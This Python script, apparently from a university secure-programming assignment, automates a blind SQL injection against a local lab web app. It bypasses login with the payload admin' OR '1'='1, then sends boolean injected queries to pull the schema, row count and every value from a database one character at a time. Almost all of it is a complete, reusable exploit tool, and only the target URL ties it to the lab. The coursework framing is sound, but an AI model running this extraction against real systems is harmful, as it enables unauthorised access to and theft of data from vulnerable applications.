#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=================================================================================
Blind SQL Injection - Automated Data Extraction Script
Secure Programming Assignment 1 - Section 5
=================================================================================

Why this script was written:
-----------------------------
Manual data extraction using Blind SQL Injection is an extremely slow and 
tedious process. For a table with 3 rows containing strings up to 64+ characters
long, hundreds of HTTP requests would be needed with manual tracking of each 
character found. This script provides complete automation of the process and 
reduces execution time from several hours to just a few minutes.

How this script helped solve the exercise:
-------------------------------------------
1. Automated login to the system using SQL Injection bypass on login.php
2. Discovered the table name in the 'secure' database (32 characters) from 
   information_schema.tables
3. Extracted column names (id, random) from information_schema.columns
4. Counted the number of rows (3) from information_schema.tables.TABLE_ROWS
5. Extracted all data character-by-character using Content-based Blind SQLi
6. Displayed results in an organized and readable format

The process the script performs:
---------------------------------
a. Uses boolean queries to test if SQL conditions are TRUE or FALSE
b. When condition is TRUE - alice's details are displayed (her hash is in HTML)
c. When condition is FALSE - alice's details disappear
d. Using this technique, each character is extracted separately using SUBSTRING
   or ASCII functions

Example query:
alice' AND SUBSTRING((SELECT table_name FROM information_schema.tables 
WHERE table_schema='secure' LIMIT 1),1,1)='7' AND '1'='1

If the response contains alice's hash, then the first character is '7'.

Dependencies:
-------------
Python 3.8+ with only standard libraries (no external dependencies):
- urllib.request (built-in)
- urllib.parse (built-in)
- string (built-in)
- sys (built-in)

Running the script:
-------------------
python3 blind_sqli_solution.py

Expected output:
----------------
The script will extract and display:
- Table name: 789b05678e7f955d2cf125b0c05616c9
- Columns: id, random
- Number of rows: 3
- All data in the table

Author: Secure Programming Exercise
Date: April 2026
=================================================================================
"""

import urllib.request
import urllib.parse
import string
import sys


class BlindSQLInjection:
    """
    Class for exploiting Blind SQL Injection vulnerability and extracting 
    data from the secure database
    """
    
    def __init__(self, base_url="http://localhost:8000"):
        """
        Initialize the class
        
        Parameters:
            base_url: Base URL of the server (default: localhost:8000)
        """
        self.base_url = base_url
        self.login_url = f"{base_url}/login.php"
        self.blind_sqli_url = f"{base_url}/blindsqli.php"
        self.session_cookie = None
        
    def login(self):
        """
        Login to the system using SQL Injection bypass
        
        Uses payload: admin' OR '1'='1 to bypass password check
        
        Returns:
            True if login successful, False otherwise
        """
        print("[*] Logging in to the system...")
        
        # Payload for login bypass
        login_data = {
            "username": "admin' OR '1'='1",
            "password": "anything"
        }
        
        data = urllib.parse.urlencode(login_data).encode('utf-8')
        req = urllib.request.Request(self.login_url, data=data)
        
        try:
            with urllib.request.urlopen(req) as response:
                # Save session cookie
                cookies = response.getheader('Set-Cookie')
                if cookies:
                    self.session_cookie = cookies.split(';')[0]
                
                print("[+] Login successful!")
                return True
        except Exception as e:
            print(f"[-] Login failed: {e}")
            return False
    
    def check_condition(self, condition):
        """
        Check if a SQL condition returns TRUE or FALSE
        
        TRUE = alice's data is displayed (her hash is in the response)
        FALSE = alice's data is hidden (hash not in the response)
        
        Parameters:
            condition: SQL condition to test
        
        Returns:
            True if condition is true, False otherwise
        """
        # Build payload with injection
        payload = f"alice' AND {condition} AND '1'='1"
        
        # URL encode the payload
        params = urllib.parse.urlencode({'user': payload})
        url = f"{self.blind_sqli_url}?{params}"
        
        # Create request with session cookie
        req = urllib.request.Request(url)
        if self.session_cookie:
            req.add_header('Cookie', self.session_cookie)
        
        try:
            with urllib.request.urlopen(req) as response:
                html = response.read().decode('utf-8')
                
                # Check if alice's hash appears (TRUE condition)
                return "c93239cae450631e9f55d71aed99e918" in html
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return False
    
    def get_table_name_length(self):
        """
        Find the length of the table name in the secure database
        
        Uses CHAR_LENGTH on the table name in information_schema
        
        Returns:
            Integer - length of table name, or None if not found
        """
        print("[*] Finding table name length...")
        
        # First try to find a range using > and < comparisons
        if self.check_condition("CHAR_LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1))>5"):
            print("[+] Length is greater than 5")
            
            # Binary search for exact length
            low, high = 6, 100
            
            while low <= high:
                mid = (low + high) // 2
                
                if self.check_condition(f"CHAR_LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1))={mid}"):
                    print(f"[+] Table name length: {mid}")
                    return mid
                elif self.check_condition(f"CHAR_LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1))<{mid}"):
                    high = mid - 1
                else:
                    low = mid + 1
        
        # Fallback to linear search if binary search fails
        for length in range(1, 100):
            condition = f"CHAR_LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1))={length}"
            
            if self.check_condition(condition):
                print(f"[+] Table name length: {length}")
                return length
        
        return None
    
    def extract_table_name(self, length):
        """
        Extract table name character by character
        
        Uses SUBSTRING to extract each character separately
        
        Parameters:
            length: Known length of the table name
        
        Returns:
            String - extracted table name
        """
        print(f"[*] Extracting table name ({length} characters)...")
        
        table_name = ""
        charset = string.ascii_lowercase + string.digits
        
        for position in range(1, length + 1):
            found = False
            
            # Try each character in charset
            for char in charset:
                condition = f"SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1),{position},1)='{char}'"
                
                if self.check_condition(condition):
                    table_name += char
                    print(f"[+] Position {position:2d}: '{char}' -> {table_name}")
                    found = True
                    break
            
            # Fallback to ASCII comparison if charset failed
            if not found:
                for ascii_val in range(32, 127):
                    char = chr(ascii_val)
                    condition = f"ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1),{position},1))={ascii_val}"
                    
                    if self.check_condition(condition):
                        table_name += char
                        print(f"[+] Position {position:2d}: '{char}' (ASCII) -> {table_name}")
                        found = True
                        break
            
            if not found:
                table_name += "?"
                print(f"[-] Position {position:2d}: NOT FOUND")
        
        return table_name
    
    def get_column_count(self, table_name):
        """
        Count number of columns in the table
        
        Parameters:
            table_name: Name of table in secure database
        
        Returns:
            Number of columns
        """
        print(f"\n[*] Counting columns in table {table_name}...")
        
        for count in range(1, 20):
            condition = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}')={count}"
            
            if self.check_condition(condition):
                print(f"[+] Number of columns: {count}")
                return count
        
        return None
    
    def extract_column_name(self, table_name, column_index):
        """
        Extract a single column name
        
        Parameters:
            table_name: Name of the table
            column_index: Index of column (0-based)
        
        Returns:
            Column name as string
        """
        print(f"\n[*] Extracting column #{column_index + 1} name...")
        
        # Find length using LENGTH
        column_length = None
        for length in range(1, 50):
            condition = f"LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}' LIMIT {column_index},1))={length}"
            
            if self.check_condition(condition):
                print(f"[+] Column name length: {length}")
                column_length = length
                break
        
        # If LENGTH fails, try extracting without known length
        if column_length is None:
            print("[*] Extracting without known length...")
            column_name = ""
            charset = string.ascii_lowercase + string.digits + "_"
            
            for position in range(1, 31):
                # Check if position exists
                if not self.check_condition(f"LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}' LIMIT {column_index},1))>={position}"):
                    print(f"[+] Reached end at position {position - 1}")
                    return column_name
                
                found = False
                for char in charset:
                    condition = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}' LIMIT {column_index},1),{position},1)='{char}'"
                    
                    if self.check_condition(condition):
                        column_name += char
                        print(f"[+] Position {position:2d}: '{char}' -> {column_name}")
                        found = True
                        break
                
                if not found:
                    # Try ASCII
                    for ascii_val in range(32, 127):
                        char = chr(ascii_val)
                        condition = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}' LIMIT {column_index},1),{position},1))={ascii_val}"
                        
                        if self.check_condition(condition):
                            column_name += char
                            print(f"[+] Position {position:2d}: '{char}' (ASCII) -> {column_name}")
                            found = True
                            break
                
                if not found:
                    column_name += "?"
            
            return column_name
        
        # Extract with known length
        column_name = ""
        charset = string.ascii_lowercase + string.digits + "_"
        
        for position in range(1, column_length + 1):
            found = False
            
            for char in charset:
                condition = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}' LIMIT {column_index},1),{position},1)='{char}'"
                
                if self.check_condition(condition):
                    column_name += char
                    print(f"[+] Position {position:2d}: '{char}' -> {column_name}")
                    found = True
                    break
            
            if not found:
                for ascii_val in range(32, 127):
                    char = chr(ascii_val)
                    condition = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='secure' AND table_name='{table_name}' LIMIT {column_index},1),{position},1))={ascii_val}"
                    
                    if self.check_condition(condition):
                        column_name += char
                        print(f"[+] Position {position:2d}: '{char}' (ASCII) -> {column_name}")
                        found = True
                        break
            
            if not found:
                column_name += "?"
        
        return column_name
    
    def get_row_count(self, table_name):
        """
        Count number of rows in table from TABLE_ROWS
        
        Parameters:
            table_name: Name of the table
        
        Returns:
            Number of rows
        """
        print(f"\n[*] Counting rows in table {table_name}...")
        
        for count in range(0, 100):
            condition = f"(SELECT TABLE_ROWS FROM information_schema.tables WHERE table_schema='secure' AND table_name='{table_name}')={count}"
            
            if self.check_condition(condition):
                print(f"[+] Number of rows: {count}")
                return count
        
        return None
    
    def extract_value(self, table_name, column_name, row_index):
        """
        Extract a single cell value from the table
        
        Parameters:
            table_name: Name of the table
            column_name: Name of the column
            row_index: Row index (0-based)
        
        Returns:
            Extracted value as string, or None if NULL/empty
        """
        print(f"\n[*] Extracting {column_name} from row {row_index + 1}...")
        
        # Check if value is NULL
        if self.check_condition(f"(SELECT {column_name} FROM secure.{table_name} LIMIT {row_index},1) IS NULL"):
            print("[+] Value is NULL")
            return None
        
        # Get value length
        value_length = None
        for length in range(0, 200):
            condition = f"LENGTH((SELECT {column_name} FROM secure.{table_name} LIMIT {row_index},1))={length}"
            
            if self.check_condition(condition):
                print(f"[+] Value length: {length}")
                value_length = length
                break
        
        if value_length is None or value_length == 0:
            print("[-] Could not find value length or value is empty")
            return ""
        
        # Extract value character by character
        value = ""
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-@!#$%^&*()+=[]{}|;:,.<>?/~ "
        
        for position in range(1, value_length + 1):
            found = False
            
            for char in charset:
                if char == "'":  # Skip single quote to avoid SQL syntax issues
                    continue
                
                condition = f"SUBSTRING((SELECT {column_name} FROM secure.{table_name} LIMIT {row_index},1),{position},1)='{char}'"
                
                if self.check_condition(condition):
                    value += char
                    print(f"[+] Position {position:2d}: '{char}' -> {value}")
                    found = True
                    break
            
            if not found:
                # Try ASCII approach for all printable characters
                for ascii_val in range(32, 127):
                    char = chr(ascii_val)
                    condition = f"ASCII(SUBSTRING((SELECT {column_name} FROM secure.{table_name} LIMIT {row_index},1),{position},1))={ascii_val}"
                    
                    if self.check_condition(condition):
                        value += char
                        print(f"[+] Position {position:2d}: '{char}' (ASCII) -> {value}")
                        found = True
                        break
            
            if not found:
                value += "?"
                print(f"[-] Position {position:2d}: NOT FOUND")
        
        return value
    
    def run(self):
        """
        Main execution flow - extracts all data from secure database
        
        Returns:
            Dictionary with complete extraction results
        """
        print("=" * 80)
        print("Blind SQL Injection - Automated Data Extraction")
        print("Section 5: Extract data from 'secure' database")
        print("=" * 80)
        print()
        
        # Step 1: Login
        if not self.login():
            print("[!] Failed to login. Exiting.")
            return None
        
        # Step 2: Find table name length
        table_length = self.get_table_name_length()
        if not table_length:
            print("[!] Failed to find table name length. Exiting.")
            return None
        
        # Step 3: Extract table name
        table_name = self.extract_table_name(table_length)
        print(f"\n[✓] Table name: {table_name}")
        
        # Step 4: Get column count
        col_count = self.get_column_count(table_name)
        if not col_count:
            print("[!] Failed to get column count. Exiting.")
            return None
        
        # Step 5: Extract column names
        columns = []
        for i in range(col_count):
            col_name = self.extract_column_name(table_name, i)
            columns.append(col_name)
        
        print(f"\n[✓] Columns: {', '.join(columns)}")
        
        # Step 6: Count rows
        row_count = self.get_row_count(table_name)
        if row_count is None:
            print("[!] Failed to count rows. Exiting.")
            return None
        
        # Step 7: Extract all data
        data = []
        for row_index in range(row_count):
            print(f"\n{'='*80}")
            print(f"Extracting Row {row_index + 1}/{row_count}")
            print(f"{'='*80}")
            
            row_data = {}
            for col_name in columns:
                value = self.extract_value(table_name, col_name, row_index)
                row_data[col_name] = value
            
            data.append(row_data)
        
        # Compile results
        results = {
            'database': 'secure',
            'table_name': table_name,
            'columns': columns,
            'row_count': row_count,
            'data': data
        }
        
        return results
    
    def print_results(self, results):
        """
        Print extraction results in a formatted table
        
        Parameters:
            results: Dictionary with extraction results
        """
        print("\n" + "=" * 80)
        print("[✓] EXTRACTION COMPLETE")
        print("=" * 80)
        print(f"\nDatabase: {results['database']}")
        print(f"Table: {results['table_name']}")
        print(f"Columns: {', '.join(results['columns'])}")
        print(f"Rows: {results['row_count']}")
        print("\n" + "-" * 80)
        print("DATA:")
        print("-" * 80)
        
        # Print header
        header = " | ".join([f"{col:15}" for col in results['columns']])
        print(header)
        print("-" * 80)
        
        # Print rows
        for row in results['data']:
            row_str = " | ".join([f"{str(row.get(col, 'NULL')):15}" for col in results['columns']])
            print(row_str)
        
        print("=" * 80)
        
        # Print summary
        print("\nSUMMARY FOR ASSIGNMENT:")
        print(f"Number of rows in table: {results['row_count']}")
        print("\nValues in table:")
        for i, row in enumerate(results['data'], 1):
            values = ', '.join([f"{col}={row.get(col, 'NULL')}" for col in results['columns']])
            print(f"  Row {i}: {values}")
        print()


def main():
    """
    Main entry point
    """
    # Create exploiter instance
    exploiter = BlindSQLInjection(base_url="http://localhost:8000")
    
    # Run extraction
    results = exploiter.run()
    
    if results:
        # Print formatted results
        exploiter.print_results(results)
        
        print("\n[✓] Script completed successfully!")
        return 0
    else:
        print("\n[!] Script failed to extract data.")
        return 1


if __name__ == "__main__":
    sys.exit(main())